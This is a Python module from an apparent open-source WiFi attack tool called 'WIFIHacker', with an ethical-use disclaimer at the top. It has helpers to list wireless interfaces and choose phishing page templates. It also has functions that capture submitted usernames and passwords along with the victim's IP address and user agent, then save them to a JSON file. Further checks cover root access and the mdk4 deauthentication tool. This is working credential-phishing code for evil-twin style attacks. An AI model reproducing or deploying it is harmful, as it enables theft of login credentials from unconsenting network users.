#!/usr/bin/env python

"""
WIFIHacker - Wireless Penetration Testing Tool
----------------------------------------------

Author      : Karthikeyan (https://karthithehacker.com)
GitHub      : https://github.com/karthi-the-hacker
Project     : WIFIHacker - A tool for WiFi auditing, penetration testing, and security assessments.

License     : Open-source for educational and ethical hacking purposes ONLY.

Note to Users:
--------------
🔐 This tool is meant strictly for educational, research, and authorized security testing.
🚫 Unauthorized use of this tool on networks you don’t own or have permission to test is illegal.
❗ If you use or modify this code, GIVE PROPER CREDIT to the original author.

Warning to Code Thieves:
------------------------
❌ Removing this header or claiming this project as your own without credit is unethical and against the open-source community principles.
🧠 Writing your own code earns respect. Copy-pasting without attribution does not.
✅ Be an ethical hacker. Respect developers' hard work and give credit where it's due.

"""
from includes import banner
from rich.console import Console
from rich.panel import Panel
from datetime import datetime
import os
import json
from shutil import which


console = Console()

def get_wifi_interfaces():
    import subprocess
    result = subprocess.run(["iw", "dev"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
    interfaces = []
    for line in result.stdout.splitlines():
        line = line.strip()
        if line.startswith("Interface"):
            iface = line.split()[1]
            interfaces.append(iface)
    return interfaces



def choose_template():
    banner.show_banner()
    template_dir = "templates"
    templates = [name for name in os.listdir(template_dir) if os.path.isdir(os.path.join(template_dir, name))]

    if not templates:
        print("❌ No templates found.")
        return None

    console = Console()

    # Build the list in a single string
    template_list = "\n".join(f"[cyan]{i + 1}[/cyan]. {name}" for i, name in enumerate(templates))

    # Display in a single panel
    console.print(Panel.fit(
        f"🎭 [bold yellow]Available Templates[/bold yellow]\n\n{template_list}",
        border_style="magenta"
    ))

    while True:
        choice = input("🔢 Select template number (or 0 to go back): ")
        if choice.isdigit():
            choice = int(choice)
            if choice == 0:
                return None
            elif 1 <= choice <= len(templates):
                return templates[choice - 1]
        print("❌ Invalid choice. Try again.")


def post_data(data,self):
    username = data.get("username", [""])[0]
    password = data.get("password", [""])[0]
    client_ip = self.client_address[0]
    user_agent = self.headers.get('User-Agent', '')
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    entry = {
                "username": username,
                "password": password,
                "template": os.path.basename(os.getcwd()),
                "datetime": timestamp,
                "ip": client_ip,
                "useragent": user_agent
            }
    return entry


def savecred(all_data,CRED_FILE):
    with open(os.getcwd()+CRED_FILE, "w") as f:
        json.dump(all_data, f, indent=4)
    print(f"[+] Credentials saved to file.  {os.path.abspath(os.getcwd()+CRED_FILE)}")


def check_sudo():
    if os.geteuid() != 0:
        console.print("[red]❌ This script must be run as root (sudo).[/red]")
        exit()

def check_mdk4():
    if which("mdk4") is None:
        console.print("[red]❌ mdk4 is not installed. Install it using:[/red] [yellow]sudo apt install mdk4[/yellow]")
        exit()
    else:
        console.print("[green]✅ mdk4 found.[/green]")
